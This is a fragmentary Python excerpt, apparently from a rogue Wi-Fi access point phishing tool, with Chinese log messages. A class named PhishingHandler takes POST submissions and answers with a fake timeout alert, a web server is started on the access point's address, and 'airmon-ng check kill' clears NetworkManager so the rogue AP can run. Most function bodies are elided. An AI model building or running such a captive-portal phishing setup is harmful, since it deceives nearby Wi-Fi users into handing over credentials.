...
class PhishingHandler(BaseHTTPRequestHandler):
    ...
    def do_POST(self):
        try:
            ...
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<script>alert('Error: Timeout');</script>")
        except Exception:
            pass
...
def start_web_server():
    try:
        ...
        log(f"Web Server 已启动 ({AP_IP}:{WEB_PORT})", "WEB")
...
def cleanup_network():
    log("清理网络环境...", "SYSTEM")
    run_cmd("airmon-ng check kill")  # 关键：防止 NetworkManager 干扰 AP
